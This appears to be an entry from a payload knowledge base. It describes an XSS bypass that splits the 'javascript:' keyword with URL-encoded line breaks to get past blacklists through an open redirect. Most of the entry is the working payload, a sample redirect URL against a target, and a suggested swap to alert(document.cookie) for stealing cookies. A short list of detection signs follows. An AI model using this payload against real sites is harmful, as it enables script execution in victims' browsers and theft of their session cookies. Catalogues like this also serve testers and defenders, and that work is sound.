---
id: 754dcba5-c64b-4243-a976-ec08e98df03f
type: code
language: url-payload
verified: true
created_at: '2023-04-06T03:56:31.798275+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - xss
  - protocol-bypass
validated: true
---

# JavaScript-Keyword-Bypass-With-Line-Breaks

## Code

```url-payload
java%0d%0ascript%0d%0a:alert(0)
```

## Description

Encodes line breaks to split 'javascript:' , evading keyword blacklists while allowing JS protocol execution for XSS via redirect.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| alert(0) | JS payload to execute | alert(document.cookie) |

## Usage

In redirect: http://target.com/redirect?url=java%0d%0ascript%0d%0a:alert(0). Executes in browser context for testing or payload delivery.

## Detection

- URL decoding logs showing split keywords.
- JS execution monitoring in browser consoles.
- CSP violations for inline scripts.

## Related

- [[procedures/Bypass-Open-URL-Redirection-Filters]]
